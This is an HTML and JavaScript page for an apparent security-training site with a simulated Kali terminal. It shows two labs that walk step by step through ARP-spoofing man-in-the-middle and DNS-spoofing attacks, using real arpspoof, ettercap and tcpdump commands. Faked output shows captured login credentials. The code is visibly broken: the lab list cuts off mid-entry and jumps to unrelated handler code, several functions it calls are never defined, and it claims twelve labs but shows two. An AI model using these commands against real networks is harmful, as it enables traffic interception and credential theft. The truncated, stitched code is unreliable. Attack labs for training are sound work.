<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>CyberLab · Interactive Security Training Ground</title>
<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;600;700&family=Inter:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
<style>
:root{
  --bg:#0a0e14; --bg-raised:#0f1419; --bg-card:#131920; --bg-terminal:#080c10;
  --fg:#c5cdd8; --fg-bright:#e8edf3; --fg-dim:#5a6678;
  --accent:#00ff9c; --accent-dim:rgba(0,255,156,.12); --accent-mid:rgba(0,255,156,.3);
  --red:#ff3b5c; --red-dim:rgba(255,59,92,.12);
  --orange:#ff9f43; --orange-dim:rgba(255,159,67,.12);
  --cyan:#00d4ff; --cyan-dim:rgba(0,212,255,.12);
  --yellow:#ffd93d; --yellow-dim:rgba(255,217,61,.12);
  --purple:#a855f7; --purple-dim:rgba(168,85,247,.12);
  --border:#1e2733; --border-light:#2a3544;
  --radius:10px; --mono:'JetBrains Mono',monospace; --sans:'Inter',system-ui,sans-serif;
}
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:var(--sans);background:var(--bg);color:var(--fg);min-height:100vh;overflow-x:hidden}
.bg-grid{position:fixed;inset:0;z-index:0;pointer-events:none;
  background-image:linear-gradient(rgba(0,255,156,.025) 1px,transparent 1px),linear-gradient(90deg,rgba(0,255,156,.025) 1px,transparent 1px);
  background-size:60px 60px}
.bg-glow{position:fixed;z-index:0;pointer-events:none;width:600px;height:600px;border-radius:50%;filter:blur(150px);opacity:.08}
.bg-glow-1{top:-200px;right:-100px;background:var(--accent)}
.bg-glow-2{bottom:-200px;left:-100px;background:var(--cyan)}
.app{position:relative;z-index:1}
.topbar{display:flex;align-items:center;justify-content:space-between;padding:14px 28px;
  background:rgba(10,14,20,.85);backdrop-filter:blur(20px);border-bottom:1px solid var(--border);
  position:sticky;top:0;z-index:100}
.topbar-left{display:flex;align-items:center;gap:12px}
.logo{width:36px;height:36px;border-radius:8px;background:linear-gradient(135deg,var(--accent),var(--cyan));
  display:flex;align-items:center;justify-content:center;font-size:1rem;color:#000;font-weight:800}
.title{font-size:1rem;font-weight:700;color:var(--fg-bright)}
.subtitle{font-size:.65rem;color:var(--fg-dim);font-weight:500;letter-spacing:1px;text-transform:uppercase}
.topbar-right{display:flex;align-items:center;gap:10px}
.stat-pill{display:flex;align-items:center;gap:6px;padding:6px 12px;border-radius:20px;font-size:.72rem;font-weight:600;
  border:1px solid var(--border-light);background:var(--bg-card)}
.stat-pill i{color:var(--accent)}
.layout{display:grid;grid-template-columns:280px 1fr;min-height:calc(100vh - 65px)}
.sidebar{background:var(--bg-raised);border-right:1px solid var(--border);padding:20px 0;
  overflow-y:auto;max-height:calc(100vh - 65px);position:sticky;top:65px}
.sidebar::-webkit-scrollbar{width:3px}
.sidebar::-webkit-scrollbar-thumb{background:var(--border-light);border-radius:10px}
.sidebar-section{margin-bottom:18px}
.sidebar-label{font-size:.62rem;font-weight:700;color:var(--fg-dim);text-transform:uppercase;letter-spacing:1.5px;
  padding:0 20px;margin-bottom:10px}
.lab-item{display:flex;align-items:center;gap:12px;padding:10px 20px;cursor:pointer;
  transition:.15s;border-left:3px solid transparent;position:relative}
.lab-item:hover{background:rgba(255,255,255,.025)}
.lab-item.active{background:var(--accent-dim);border-left-color:var(--accent)}
.lab-item.done .lab-icon{background:var(--accent-dim);color:var(--accent);border-color:var(--accent-mid)}
.lab-icon{width:30px;height:30px;border-radius:7px;flex-shrink:0;display:flex;align-items:center;justify-content:center;
  font-size:.8rem;background:var(--bg-card);color:var(--fg-dim);border:1px solid var(--border-light);transition:.3s}
.lab-item.active .lab-icon{background:var(--accent);color:#000;border-color:var(--accent)}
.lab-info{flex:1;min-width:0}
.lab-name{font-size:.8rem;font-weight:600;color:var(--fg-bright);line-height:1.2}
.lab-item.active .lab-name{color:var(--accent)}
.lab-cat{font-size:.65rem;color:var(--fg-dim);margin-top:2px}
.content{padding:24px 28px;max-width:1400px}
.lab-header{margin-bottom:24px}
.lab-tag{display:inline-flex;align-items:center;gap:8px;font-size:.7rem;font-weight:700;color:var(--accent);
  text-transform:uppercase;letter-spacing:2px;margin-bottom:10px;font-family:var(--mono)}
.lab-tag::before{content:'';width:24px;height:2px;background:var(--accent);border-radius:1px}
.lab-header h1{font-size:1.8rem;font-weight:800;color:var(--fg-bright);line-height:1.2;margin-bottom:10px}
.lab-header p{font-size:.9rem;color:var(--fg-dim);line-height:1.7;max-width:800px}
.card{background:var(--bg-card);border:1px solid var(--border);border-radius:var(--radius);padding:18px;margin-bottom:18px}
.card-head{display:flex;align-items:center;gap:10px;margin-bottom:12px}
.card-icon{width:32px;height:32px;border-radius:7px;display:flex;align-items:center;justify-content:center;font-size:.85rem}
.card-icon.green{background:var(--accent-dim);color:var(--accent)}
.card-icon.cyan{background:var(--cyan-dim);color:var(--cyan)}
.card-icon.orange{background:var(--orange-dim);color:var(--orange)}
.card-icon.red{background:var(--red-dim);color:var(--red)}
.card-icon.yellow{background:var(--yellow-dim);color:var(--yellow)}
.card-icon.purple{background:var(--purple-dim);color:var(--purple)}
.card-title{font-size:.92rem;font-weight:700;color:var(--fg-bright)}
.card-body{font-size:.84rem;color:var(--fg);line-height:1.7}
.card-body ul{list-style:none;padding:0}
.card-body ul li{padding:4px 0;padding-left:18px;position:relative}
.card-body ul li::before{content:'?';position:absolute;left:0;color:var(--accent);font-weight:700}
.tool-pill{display:inline-block;padding:4px 11px;border-radius:5px;font-size:.74rem;font-weight:600;
  background:var(--cyan-dim);color:var(--cyan);border:1px solid rgba(0,212,255,.2);font-family:var(--mono);margin:2px}
.lab-progress{display:flex;align-items:center;gap:12px;margin-bottom:18px;
  background:var(--bg-card);border:1px solid var(--border);border-radius:var(--radius);padding:12px 16px}
.step-dots{display:flex;gap:6px;flex:1}
.step-dot{height:6px;flex:1;border-radius:3px;background:var(--border-light);transition:.3s}
.step-dot.active{background:var(--accent);box-shadow:0 0 8px var(--accent-mid)}
.step-dot.done{background:var(--accent);opacity:.5}
.step-text{font-size:.78rem;font-weight:600;color:var(--fg-dim);font-family:var(--mono);white-space:nowrap}
.step-text span{color:var(--accent)}
.scenario{background:linear-gradient(135deg,rgba(255,59,92,.08),rgba(255,159,67,.05));
  border:1px solid rgba(255,59,92,.2);border-radius:var(--radius);padding:14px 18px;margin-bottom:18px;
  display:flex;gap:12px;align-items:flex-start}
.scenario i{color:var(--red);font-size:1rem;padding-top:2px}
.scenario-text{font-size:.82rem;color:var(--fg);line-height:1.6}
.scenario-text strong{color:var(--orange)}
.terminal-wrap{margin-bottom:18px}
.terminal-bar{display:flex;align-items:center;justify-content:space-between;padding:10px 16px;
  background:#0d1117;border:1px solid var(--border);border-bottom:none;border-radius:var(--radius) var(--radius) 0 0}
.term-left{display:flex;align-items:center;gap:12px}
.term-dots{display:flex;gap:6px}
.term-dots span{width:11px;height:11px;border-radius:50%}
.term-dots span:nth-child(1){background:#ff5f57}
.term-dots span:nth-child(2){background:#febc2e}
.term-dots span:nth-child(3){background:#28c840}
.term-tab{font-size:.72rem;font-weight:600;color:var(--fg-dim);font-family:var(--mono);
  padding:4px 11px;background:var(--bg-card);border-radius:5px;border:1px solid var(--border)}
.term-actions{display:flex;gap:6px}
.term-btn{padding:4px 10px;border-radius:5px;font-size:.68rem;font-weight:600;
  border:1px solid var(--border-light);background:var(--bg-card);color:var(--fg-dim);cursor:pointer;
  font-family:var(--mono);transition:.2s;display:flex;align-items:center;gap:5px}
.term-btn:hover{border-color:var(--accent);color:var(--accent)}
.terminal-body{background:var(--bg-terminal);border:1px solid var(--border);border-top:none;
  border-radius:0 0 var(--radius) var(--radius);padding:16px;height:440px;overflow-y:auto;
  font-family:var(--mono);font-size:.8rem;line-height:1.65}
.terminal-body::-webkit-scrollbar{width:4px}
.terminal-body::-webkit-scrollbar-thumb{background:var(--border-light);border-radius:10px}
.t-line{white-space:pre-wrap;word-break:break-all}
.t-prompt{color:var(--accent)}
.t-cmd{color:var(--fg-bright)}
.t-output{color:var(--fg-dim)}
.t-highlight{color:var(--cyan)}
.t-warning{color:var(--orange)}
.t-error{color:var(--red)}
.t-success{color:var(--accent)}
.t-info{color:var(--yellow)}
.t-step{color:var(--purple);font-weight:600}
.t-separator{color:var(--border-light)}
.t-hint{color:var(--yellow);font-style:italic}
.term-input-line{display:flex;align-items:center;gap:6px;margin-top:4px}
.term-input-line .t-prompt{white-space:nowrap}
.term-input{flex:1;background:transparent;border:none;outline:none;color:var(--fg-bright);
  font-family:var(--mono);font-size:.8rem;caret-color:var(--accent)}
.hint-panel{background:var(--bg-card);border:1px solid var(--border);border-radius:var(--radius);
  padding:14px 18px;margin-bottom:18px;display:flex;align-items:flex-start;gap:12px}
.hint-icon{width:32px;height:32px;border-radius:7px;flex-shrink:0;background:var(--yellow-dim);color:var(--yellow);
  display:flex;align-items:center;justify-content:center;font-size:.85rem}
.hint-content{flex:1}
.hint-label{font-size:.7rem;font-weight:700;color:var(--yellow);text-transform:uppercase;letter-spacing:1px;margin-bottom:4px}
.hint-text{font-size:.84rem;color:var(--fg);line-height:1.6}
.hint-text code{background:var(--bg);padding:2px 6px;border-radius:3px;color:var(--accent);font-family:var(--mono)}
.network-card{background:var(--bg-card);border:1px solid var(--border);border-radius:var(--radius);
  padding:20px;margin-bottom:18px;position:relative;overflow:hidden}
.network-card::before{content:'';position:absolute;inset:0;
  background-image:radial-gradient(circle,var(--border) 1px,transparent 1px);background-size:24px 24px;opacity:.4}
.network-title{font-size:.7rem;font-weight:700;color:var(--fg-dim);text-transform:uppercase;
  letter-spacing:1.5px;margin-bottom:16px;position:relative;display:flex;align-items:center;gap:8px}
.network-nodes{display:flex;align-items:center;justify-content:center;gap:28px;flex-wrap:wrap;position:relative}
.net-node{display:flex;flex-direction:column;align-items:center;gap:6px}
.net-icon{width:50px;height:50px;border-radius:12px;display:flex;align-items:center;justify-content:center;
  font-size:1.1rem;border:2px solid var(--border-light);transition:.5s}
.net-icon.attacker{background:var(--red-dim);color:var(--red);border-color:rgba(255,59,92,.3)}
.net-icon.target{background:var(--orange-dim);color:var(--orange);border-color:rgba(255,159,67,.3)}
.net-icon.internal{background:var(--cyan-dim);color:var(--cyan);border-color:rgba(0,212,255,.3)}
.net-icon.exfil{background:var(--purple-dim);color:var(--purple);border-color:rgba(168,85,247,.3)}
.net-icon.pulsing{animation:npulse 2s infinite}
@keyframes npulse{0%,100%{box-shadow:0 0 0 0 rgba(0,255,156,.4)}50%{box-shadow:0 0 0 10px rgba(0,255,156,0)}}
.net-label{font-size:.7rem;font-weight:600;color:var(--fg-dim);text-align:center}
.net-ip{font-size:.62rem;color:var(--fg-dim);font-family:var(--mono);opacity:.7}
.net-arrow{color:var(--fg-dim);font-size:1rem;opacity:.4;position:relative}
.net-arrow.active{color:var(--red);opacity:1;animation:arrowflow 1.5s infinite}
@keyframes arrowflow{0%,100%{opacity:1}50%{opacity:.3}}
.complete-banner{display:none;align-items:center;gap:12px;padding:16px 20px;border-radius:var(--radius);
  background:var(--accent-dim);border:1px solid var(--accent-mid);margin-bottom:18px}
.complete-banner.show{display:flex}
.complete-banner i{color:var(--accent);font-size:1.2rem}
.complete-banner span{color:var(--accent);font-weight:600;font-size:.88rem}
.btn{padding:11px 22px;border-radius:var(--radius);font-size:.85rem;font-weight:700;cursor:pointer;
  border:1px solid var(--border-light);background:var(--bg-card);color:var(--fg);font-family:var(--sans);
  transition:.2s;display:inline-flex;align-items:center;gap:8px}
.btn:hover{border-color:var(--accent);color:var(--accent)}
.btn.primary{background:linear-gradient(135deg,var(--accent),#00d4aa);color:#000;border:none;
  box-shadow:0 4px 20px rgba(0,255,156,.2)}
.btn.primary:hover{transform:translateY(-2px);box-shadow:0 6px 30px rgba(0,255,156,.3)}
.btn:disabled{opacity:.4;cursor:not-allowed;transform:none;box-shadow:none}
.final-screen{text-align:center;padding:50px 20px}
.final-icon{width:80px;height:80px;border-radius:50%;background:var(--accent-dim);
  border:2px solid var(--accent-mid);display:inline-flex;align-items:center;justify-content:center;
  font-size:2rem;color:var(--accent);margin-bottom:24px}
@media(max-width:1024px){
  .layout{grid-template-columns:1fr}
  .sidebar{position:relative;top:0;max-height:none;display:flex;overflow-x:auto;padding:12px;gap:4px;
    border-right:none;border-bottom:1px solid var(--border)}
  .sidebar-section{margin-bottom:0}
  .sidebar-label{display:none}
  .lab-item{padding:8px 12px;white-space:nowrap;border-left:none;border-bottom:2px solid transparent;flex-shrink:0}
  .lab-item.active{border-bottom-color:var(--accent);border-left:none}
  .lab-cat{display:none}
}
@media(max-width:600px){
  .topbar{padding:12px 16px}
  .content{padding:20px 16px}
  .lab-header h1{font-size:1.4rem}
  .network-nodes{gap:14px}
  .net-icon{width:42px;height:42px;font-size:.95rem}
}
</style>
</head>
<body>
<div class="bg-grid"></div>
<div class="bg-glow bg-glow-1"></div>
<div class="bg-glow bg-glow-2"></div>
<div class="app">
  <header class="topbar">
    <div class="topbar-left">
      <div class="logo"><i class="fas fa-terminal"></i></div>
      <div>
        <div class="title">CyberLab</div>
        <div class="subtitle">Interactive Security Training Ground</div>
      </div>
    </div>
    <div class="topbar-right">
      <div class="stat-pill"><i class="fas fa-check-circle"></i> <span id="completedCount">0</span> / <span id="totalCount">0</span> Labs</div>
      <button class="btn" onclick="resetCurrent()"><i class="fas fa-rotate-left"></i> Reset Lab</button>
    </div>
  </header>
  <div class="layout">
    <aside class="sidebar" id="sidebar"></aside>
    <main class="content" id="content"></main>
  </div>
</div>

<script>
// ============================================================
// LAB DEFINITIONS — 12 Interactive Attack Scenarios
// ============================================================
const LABS = [
  {
    id:'mitm', name:'ARP Spoofing MITM', category:'Network Attack', icon:'fa-user-secret', color:'red',
    description:'Perform a Man-in-the-Middle attack by poisoning the ARP cache of a victim and gateway, intercepting traffic between them.',
    scenario:'You are a pentester on engagement. The client wants you to demonstrate how an attacker on the same LAN could intercept traffic between an employee workstation (192.168.1.100) and the gateway (192.168.1.1). Your Kali machine is at 192.168.1.50.',
    objectives:['Identify your network interface and confirm connectivity','Enable IP forwarding to relay intercepted traffic','Poison the victim\'s ARP cache redirecting traffic through you','Poison the gateway\'s ARP cache for bidirectional interception','Capture credentials flowing through the MITM position'],
    tools:['arpspoof','tcpdump','ettercap','iproute2'],
    network:{a:true,a1:true,t:true,t2:true,i:false,i3:false,e:false},
    steps:[
      {instruction:'Identify your active network interface and IP address.',
       hint:'Use <code>ip addr</code> or <code>ifconfig</code> to list interfaces.',
       validate:c=>/^(ip\s+addr|ifconfig)/i.test(c.trim()),
       output:'1: lo: <LOOPBACK,UP> mtu 65536\n    inet 127.0.0.1/8 scope host lo\n2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500\n    inet 192.168.1.50/24 brd 192.168.1.255 scope global eth0\n    ether 00:0c:29:a4:b2:f1 txqueuelen 1000',
       success:'Interface eth0 identified at 192.168.1.50'},
      {instruction:'Enable IP forwarding so traffic can be relayed through your machine.',
       hint:'Write "1" to the kernel sysctl: <code>echo 1 > /proc/sys/net/ipv4/ip_forward</code>',
       validate:c=>/echo\s+1\s*>\s*\/proc\/sys\/net\/ipv4\/ip_forward/i.test(c),
       output:'[*] IP forwarding enabled — kernel will now relay packets between interfaces',
       success:'IP forwarding enabled'},
      {instruction:'Poison the victim\'s ARP cache — tell them YOU are the gateway.',
       hint:'Use arpspoof targeting the victim: <code>arpspoof -i eth0 -t 192.168.1.100 192.168.1.1</code>',
       validate:c=>/arpspoof\s+-i\s+\S+\s+-t\s+192\.168\.1\.100\s+192\.168\.1\.1/i.test(c),
       output:'Sending spoofed ARP replies:\n  192.168.1.50:0c:29:a4:b2:f1 -> 192.168.1.100 claiming 192.168.1.1\n  [...victim traffic now routed through you...]',
       success:'Victim ARP cache poisoned — outbound traffic redirected'},
      {instruction:'Now poison the gateway — tell it YOU are the victim (full duplex MITM).',
       hint:'Reverse the targets: <code>arpspoof -i eth0 -t 192.168.1.1 192.168.1.100</code>',
       validate:c=>/arpspoof\s+-i\s+\S+\s+-t\s+192\.168\.1\.1\s+192\.168\.1\.100/i.test(c),
       output:'Sending spoofed ARP replies:\n  192.168.1.50:0c:29:a4:b2:f1 -> 192.168.1.1 claiming 192.168.1.100\n  [...bidirectional interception established...]',
       success:'Gateway ARP cache poisoned — full MITM established'},
      {instruction:'Capture HTTP traffic to extract credentials in transit.',
       hint:'Use tcpdump on eth0 to capture ASCII traffic: <code>tcpdump -i eth0 -A port 80</code>',
       validate:c=>/tcpdump\s+-i\s+\S+/i.test(c),
       output:'tcpdump: verbose output suppressed\nlistening on eth0, link-type EN10MB\n\n11:42:18.342 IP 192.168.1.100.52314 > 203.0.113.10.80: Flags [P.]\nPOST /login.php HTTP/1.1\nHost: 203.0.113.10\nContent-Type: application/x-www-form-urlencoded\n\nusername=jsmith&password=Summer2024!\n\n[!] Credentials captured: jsmith / Summer2024!',
       success:'HTTP credentials captured via MITM'}
    ]
  },
  {
    id:'dns', name:'DNS Spoofing', category:'Network Attack', icon:'fa-route', color:'orange',
    description:'Redirect victims to malicious sites by injecting fake DNS responses that resolve legitimate domains to attacker-controlled IPs.',
    scenario:'Building on the MITM position, you now want to redirect users trying to access the corporate portal (intranet.targetcorp.com) to a cloned phishing page hosted on your machine (192.168.1.50).',
    objectives:['Verify current DNS resolution for the target domain','Locate and configure the DNS spoofing rules file','Launch ettercap with the DNS spoof plugin','Confirm the victim is now resolving to your malicious IP'],
    tools:['ettercap','dig','etter.dns','dnsspoof'],
    network:{a:true,a1:true,t:true,t2:false,i:false,i3:false,e:false},
    steps:[
      {instruction:'Check the current legitimate DNS resolution for the target domain.',
       hint:'Use <code>dig intranet.targetcorp.com</code> to query DNS records.',
       validate:c=>/dig\s+intranet\.targetcorp\.com/i.test(c),
       output:'; <<>> DiG 9.18.12 <<>> intranet.targetcorp.com\n;; QUESTION SECTION:\n;intranet.targetcorp.com. IN A\n\n;; ANSWER SECTION:\nintranet.targetcorp.com. 3600 IN A 10.0.0.20\n\n;; Query time: 24 msec\n;; SERVER: 192.168.1.1#53',
       success:'Target resolves legitimately to 10.0.0.20'},
      {instruction:'Add a spoofed DNS entry pointing the domain to your machine.',
       hint:'Append an A record to ettercap\'s dns file: <code>echo "intranet.targetcorp.com A 192.168.1.50" >> /etc/ettercap/etter.dns</code>',
       validate:c=>/intranet\.targetcorp\.com\s+A\s+192\.168\.1\.50/i.test(c)&&/>>?|tee/i.test(c),
       output:'[*] Spoofed A record added:\n    intranet.targetcorp.com -> 192.168.1.50',
       success:'Malicious DNS mapping configured'},
      {instruction:'Launch ettercap with unified sniffing and the DNS spoof plugin.',
       hint:'Use <code>ettercap -T -i eth0 -P dns_spoof -M arp /192.168.1.100// /192.168.1.1//</code>',
       validate:c=>/ettercap\s+.*-P\s+dns_spoof/i.test(c),
       output:'ettercap 0.8.3.1 copyright 2001-2020 Ettercap Development Team\nListening on eth0...\n\nScanning the whole netmask for hosts...\n3 hosts added to the hosts list...\n\nStarting Unified sniffing...\nActivating dns_spoof plugin...\n dns_spoof: [intranet.targetcorp.com] spoofed to 192.168.1.50',
       success:'DNS spoofing active — victim redirected to your clone'},
      {instruction:'From the victim\'s perspective, verify they now resolve to your malicious IP.',
       hint:'Use <code>dig @192.168.1.1 intranet.targetcorp.com</code> or simply <code>nslookup intranet.targetcorp.com</code>',

// INPUT HANDLING
// ============================================================
function bindInput(input){
  input.addEventListener('keydown', e=>{
    if(e.key === 'Enter'){
      const cmd = input.value;
      executeCommand(cmd);
    } else if(e.key === 'ArrowUp'){
      e.preventDefault();
      if(historyIdx > 0){ historyIdx--; input.value = commandHistory[historyIdx]; }
    } else if(e.key === 'ArrowDown'){
      e.preventDefault();
      if(historyIdx < commandHistory.length - 1){ historyIdx++; input.value = commandHistory[historyIdx]; }
      else { historyIdx = commandHistory.length; input.value = ''; }
    } else if(e.key === 'Tab'){
      e.preventDefault();
      const partial = input.value;
      const suggestions = ['nmap','tcpdump','arpspoof','ettercap','sqlmap','hydra','hashcat','curl','dig','dnsmasq','airmon-ng','airodump-ng','airbase-ng','msfvenom','nc','find','cat','echo','ip addr','ifconfig'];
      const match = suggestions.find(s=>s.startsWith(partial) && s !== partial);
      if(match) input.value = match;
    }
  });
}

function executeCommand(cmd){
  if(!cmd.trim()) return;
  const lab = LABS[currentLab];
  const step = lab.steps[currentStep];
  const tb = document.getElementById('terminalBody');

  commandHistory.push(cmd);
  historyIdx = commandHistory.length;

  const echoLine = document.createElement('div');
  echoLine.className = 't-line';
  echoLine.innerHTML = `<span class="t-prompt">attacker@kali</span><span class="t-output">:</span><span class="t-highlight">~/${lab.id}</span><span class="t-output">$ </span><span class="t-cmd">${escapeHtml(cmd)}</span>`;
  tb.insertBefore(echoLine, document.querySelector('.term-input-line'));

  if(step.validate(cmd)){
    typeOutput(step.output, ()=>{
      const succLine = document.createElement('div');
      succLine.className = 't-line t-success';
      succLine.textContent = '[+] ' + step.success;
      tb.insertBefore(succLine, document.querySelector('.term-input-line'));
      
      const sepLine = document.createElement('div');
      sepLine.className = 't-line t-separator';
      sepLine.textContent = '-'.repeat(60);
      tb.insertBefore(sepLine, document.querySelector('.term-input-line'));
      
      currentStep++;
      
      document.querySelectorAll('.step-dot').forEach((d,i)=>{
        d.classList.remove('active');
        if(i < currentStep) d.classList.add('done');
        if(i === currentStep) d.classList.add('active');
      });
      
      if(currentStep >= lab.steps.length){
        completedLabs.add(currentLab);
        renderSidebar();
        const finalLine = document.createElement('div');
        finalLine.className = 't-line t-success';
        finalLine.innerHTML = '\n[!!!] LAB COMPLETE — All objectives achieved!\n[!!!] Use the "Next Lab" button below to continue.';
        tb.insertBefore(finalLine, document.querySelector('.term-input-line'));
        document.querySelector('.term-input-line').remove();
        document.getElementById('completeBanner').classList.add('show');
        renderLab(); // Re-render to show next lab button
      } else {
        const nextStepLine = document.createElement('div');
        nextStepLine.className = 't-line t-step';
        nextStepLine.textContent = `>> Step ${currentStep+1}: ${lab.steps[currentStep].instruction}`;
        tb.insertBefore(nextStepLine, document.querySelector('.term-input-line'));
        document.querySelector('.hint-text').innerHTML = lab.steps[currentStep].hint;
        document.querySelector('.step-text').innerHTML = `Step <span>${currentStep+1}</span> / ${lab.steps.length}`;
        const inp = document.getElementById('termInput');
        if(inp){ inp.value = ''; inp.focus(); }
      }
      tb.scrollTop = tb.scrollHeight;
    });
  } else {
    const errLine = document.createElement('div');
    errLine.className = 't-line t-error';
    errLine.textContent = '[-] Command not recognized or incomplete. Check the hint and try again.';
    tb.insertBefore(errLine, document.querySelector('.term-input-line'));
    
    const hintLine = document.createElement('div');
    hintLine.className = 't-line t-hint';
    hintLine.innerHTML = '[?] Hint: ' + step.hint;
    tb.insertBefore(hintLine, document.querySelector('.term-input-line'));
    
    const inp = document.getElementById('termInput');
    if(inp){ inp.value = ''; inp.focus(); }
    tb.scrollTop = tb.scrollHeight;
  }
}

function typeOutput(text, cb){
  const tb = document.getElementById('terminalBody');
  const lines = text.split('\n');
  let lineIdx = 0;
  
  function nextLine(){
    if(lineIdx >= lines.length){
      setTimeout(cb, 100);
      return;
    }
    const div = document.createElement('div');
    div.className = 't-line t-output';
    div.textContent = lines[lineIdx];
    tb.insertBefore(div, document.querySelector('.term-input-line'));
    tb.scrollTop = tb.scrollHeight;
    lineIdx++;
    setTimeout(nextLine, 25 + Math.random()*20);
  }
  nextLine();
}

function escapeHtml(s){
  return s.replace(/[&<>"']/g, m=>({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[m]));
}

function clearTerminal(){
  const tb = document.getElementById('terminalBody');
  const lab = LABS[currentLab];
  tb.innerHTML = `<div class="t-line t-output"># Terminal cleared</div>
    <div class="t-line t-separator">${'-'.repeat(60)}</div>
    <div class="t-line t-step">>> Step ${currentStep+1}: ${lab.steps[currentStep].instruction}</div>`;
  const inputLine = document.createElement('div');
  inputLine.className = 'term-input-line';
  inputLine.innerHTML = `<span class="t-prompt">attacker@kali</span><span class="t-output">:</span><span class="t-highlight">~/${lab.id}</span><span class="t-output">$ </span><input type="text" class="term-input" id="termInput" autocomplete="off" spellcheck="false">`;
  tb.appendChild(inputLine);
  const inp = document.getElementById('termInput');
  if(inp){ inp.focus(); bindInput(inp); }
}

function showSolution(){
  const lab = LABS[currentLab];
  if(currentStep >= lab.steps.length) return;
  const step = lab.steps[currentStep];
  const inp = document.getElementById('termInput');
  if(inp){
    const match = step.hint.match(/<code>([^<]+)<\/code>/);
    if(match){
      inp.value = match[1].replace(/&lt;/g,'<').replace(/&gt;/g,'>').replace(/&amp;/g,'&').replace(/&quot;/g,'"').replace(/&#39;/g,"'");
      inp.focus();
    }
  }
}

function selectLab(idx){
  if(idx === currentLab) return;
  currentLab = idx;
  currentStep = 0;
  commandHistory = [];
  historyIdx = -1;
  renderSidebar();
  renderLab();
  window.scrollTo({top:0, behavior:'smooth'});
}

function nextLab(){
  if(currentLab < LABS.length - 1){
    currentLab++;
    currentStep = 0;
    commandHistory = [];
    historyIdx = -1;
    renderSidebar();
    renderLab();
    window.scrollTo({top:0, behavior:'smooth'});
  } else {
    showFinalScreen();
  }
}

function resetCurrent(){
  currentStep = 0;
  commandHistory = [];
  historyIdx = -1;
  renderLab();
}

function showFinalScreen(){
  const area = document.getElementById('content');
  area.innerHTML = `
    <div class="final-screen">
      <div class="final-icon"><i class="fas fa-flag-checkered"></i></div>
      <h1 style="font-size:2rem;color:var(--fg-bright);margin-bottom:12px;">All Labs Complete</h1>
      <p style="color:var(--fg-dim);max-width:600px;margin:0 auto 32px;line-height:1.7;">
        You've completed all ${LABS.length} interactive cybersecurity labs covering network attacks, web exploitation, post-exploitation, and social engineering.
      </p>
      <div style="display:grid;grid-template-columns:repeat(auto-fill,minmax(180px,1fr));gap:14px;max-width:700px;margin:0 auto 32px;">
        <div class="card" style="text-align:center;">
          <div style="font-size:1.8rem;font-weight:800;color:var(--accent);font-family:var(--mono);">${LABS.length}</div>
          <div style="font-size:.75rem;color:var(--fg-dim);margin-top:4px;">Labs Completed</div>
        </div>
        <div class="card" style="text-align:center;">
          <div style="font-size:1.8rem;font-weight:800;color:var(--cyan);font-family:var(--mono);">${LABS.reduce((a,l)=>a+l.steps.length,0)}</div>
          <div style="font-size:.75rem;color:var(--fg-dim);margin-top:4px;">Commands Practiced</div>
        </div>
        <div class="card" style="text-align:center;">
          <div style="font-size:1.8rem;font-weight:800;color:var(--orange);font-family:var(--mono);">8</div>
          <div style="font-size:.75rem;color:var(--fg-dim);margin-top:4px;">Attack Categories</div>
        </div>
        <div class="card" style="text-align:center;">
          <div style="font-size:1.8rem;font-weight:800;color:var(--purple);font-family:var(--mono);">40+</div>
          <div style="font-size:.75rem;color:var(--fg-dim);margin-top:4px;">Tools Covered</div>
        </div>
      </div>
      <button class="btn primary" onclick="currentLab=0;currentStep=0;renderSidebar();renderLab();">
        <i class="fas fa-rotate-left"></i> Start Over
      </button>
    </div>
  `;
}

// ============================================================
// BOOT
// ============================================================
document.addEventListener('DOMContentLoaded', ()=>{
  renderSidebar();
  renderLab();
});

document.addEventListener('click', e=>{
  if(e.target.closest('.terminal-body') && !e.target.closest('.term-btn')){
    const inp = document.getElementById('termInput');
    if(inp) inp.focus();
  }
});
</script>
</body>
</html>
